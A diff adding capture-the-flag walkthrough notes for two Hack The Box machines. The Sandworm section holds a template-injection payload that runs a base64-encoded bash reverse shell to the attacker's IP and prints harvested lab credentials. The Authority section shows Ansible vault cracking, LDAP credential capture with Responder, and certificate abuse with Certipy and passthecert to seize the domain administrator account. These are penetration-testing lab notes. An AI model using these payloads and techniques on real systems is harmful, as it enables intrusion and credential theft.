@@ -195,3 +195,173 @@ Lets sum up all facts we obtained:
 ### Exploitation
 ### User flag
 ### Root flag
+
+## Sandworm
+// 1 - random name
+// 2 - {{7*7}} name
+// 3 - Payload with RS + netcat
+// 4 - obtain login credentials + login through SSH => user flag
+### Reco
+1. `sudo nmap -sVC <IP> -p0-65535`
+    - 22 ssh (OpenSSH 8.9p1 Ubuntu)
+    - 80 http (redirect to https://ssa.htb)
+    - 443 https
+
+2. website
+    - sudo nano /etc/hosts
+        - <ip> ssa.htb
+    - URL: [ssa.htb](https://ssa.htb)
+        - Secret Spy Agency website containing just info + Contact form
+            - contact form consists of text to be submitted through PGP-encrypted tip
+                - PGP might be the weakness (no other functions on the website)
+    - explore possible dirs
+        - `gobuster dir -u https://ssa.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k`
+            - ![](https://hackmd.io/_uploads/rJcGHZiO3.png)
+                - ssa.htb/pgp => PGP public key
+### Weaponisation
+3. SSTI possibility (server-side template injection)
+    - [guide](https://linuxhint.com/generate-pgp-keys-gpg/)
+    - generate PGP key: `sudo gpg --gen-key`
+    - export it to the public.key file: `gpg -a -o public.key --export <filled Real name>`
+    - `cat public.key`
+    - encrypt message "helloworld" using our PGP key: `echo 'helloworld' | gpg --clear-sign`
+    - verify, if website accepts our generated PGP key message
+        - Public Key (left): generated public key
+        - Signed Text: generated PGP message block of "helloworld"
+        - ![name=Zihuatanejo ^^](https://hackmd.io/_uploads/rJjzo-od3.png)
+        - works fine ==> we can perform SSTI attack
+    ![](https://hackmd.io/_uploads/rk3YsWjOn.png)
+### Exploitation
+4. SSTI attack
+    - we can encrypt reverse shell connection inside PGP message
+    - [guide](https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/)
+    - first of all, delete previous PGP keys
+        - gpg --list-keys
+        - gpg --delete-keys hacker
+        - gpg --delete-secret-keys hacker
+        - gpg --delete-keys hacker
+        - gpg --list-keys ==> no keys found
+    - prepare reverse shell
+        - encode RS in base64
+            - !!! ifconfig: get your tun inet IP !!!
+            > echo "bash -c 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1'" | base64
+            > YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==
+        - payload for the RS:
+            - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
+    - generate new PGP key
+        - gpg --gen-key
+            - Real name: 
+                - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
+    
+    - `cat public.key`
+        - for Public Key (left side)
+    - echo 'helloworld' | gpg --clear-sign
+        - for Message (right side)
+    - lets start listening on prepared port 4444
+        - nc -nvlp 4444
+    - copy the pub key generated w payload into the UID and verify the signature
+    - we are inside
+5. obtain login credentials
+    - search for the login credentials
+            - /home => .ssh => ATLAS
+            - .config
+                - UN: silentobserver
+                - PW: quietLiketheWind22
+### User flag
+6. Login to obtain user flag
+    - ssh silentobserver@ssa.htb
+        - password: quietLiketheWind22
+    - ls
+    - cat user.txt
+    
+## Authority 
+### Reco
+1. NMAP: `sudo nmap -sVC 10.10.11.222 --min-rate=500`
+![](https://hackmd.io/_uploads/HyJFRLSqn.png)
+2. SMB running - lets to the enumeration: `smbclient -L 10.10.11.222`
+![](https://hackmd.io/_uploads/BJ7lDLIc3.png)
+    - lets inspect the Shares
+        - smbclient -N //<IP>/<Share>
+            ![](https://hackmd.io/_uploads/B1CYvUU53.png)
+3. Content of obtained main.yml file
+    ![](https://hackmd.io/_uploads/B1NADUL92.png)
+
+
+### Weaponisation
+1. Crack the hashes inside with john or hashcat
+> $cat vault*.yml
+> $ANSIBLE_VAULT;1.1;AES256
+> 633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
+> 
+> $ANSIBLE_VAULT;1.1;AES256
+> 313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
+> 
+> $ANSIBLE_VAULT;1.1;AES256
+> 326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
+2. Decrypting hashes
+
+    ![](https://hackmd.io/_uploads/HkV2ZvSqn.png)
+    - PW: DevT3st@123 
+3. Move to port 8443 and enter the PW extracted from Ansible vault
+    ![](https://hackmd.io/_uploads/r1mxfvBq3.png)
+4. Download the config file
+
+### Exploitation
+1. Edit the YML file -> go to settings section, replace your own LDAP server
+    ![](https://hackmd.io/_uploads/SyX4MwHq2.png)
+
+
+### User flag
+1. Start the responder tool and check if this is on
+
+    ![](https://hackmd.io/_uploads/S18oXDBcn.png)
+2. Upload the edited YML file on the site and wait for the responder to show with response with PW in plain text
+    ![](https://hackmd.io/_uploads/HJeRmvBc2.png)
+        - lDaP_1n_th3_cle4r!
+### Root flag
+1. Run Certify on the machine to find vuln certificates
+    ![](https://hackmd.io/_uploads/BkbbEwBq3.png)
+2. Use Add-computer from Impacket to proceed
+    ![](https://hackmd.io/_uploads/SJmzVDBc3.png)
+3. Now use Certipy
+    - If you face any error while running Certipy -> run the Certify saved in the /.local/bin dir from your home dir
+    ![](https://hackmd.io/_uploads/BkVXCU8q2.png)
+
+> $./certipy req -u RANDOM$ -p Random! -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
+> Certipy v4.5.1 - by Oliver Lyak (ly4k)
+> 
+> [*] Requesting certificate via RPC
+> [*] Successfully requested certificate
+> [*] Request ID is 17
+> [*] Got certificate with multiple identifications
+>     UPN: 'administrator@authority.htb'
+>     DNS Host Name: 'authority.authority.htb'
+> [*] Certificate has no object SID
+> [*] Saved certificate and private key to 'administrator_authority.pfx'
+> 
+> 
+> $certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
+> Certipy v4.5.1 - by Oliver Lyak (ly4k)
+> 
+> [*] Writing certificate and  to 'user.crt'
+> 
+> $certipy cert -pfx administrator_authority.pfx -nocert -out user.key
+> Certipy v4.5.1 - by Oliver Lyak (ly4k)
+> 
+> [*] Writing private key to 'user.key'
+
+4. Now use passthecert
+> $python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
+> Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+> 
+> [*] Successfully changed administrator password to: sr****************************VK
+> 
+> $evil-winrm -i 10.10.11.222 -u administrator -p sr****************************VK
+>                                         
+> Evil-WinRM shell v3.5
+>                                                                                 
+> *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+
+> htb\administrator
+    
+5. Read the root flag 
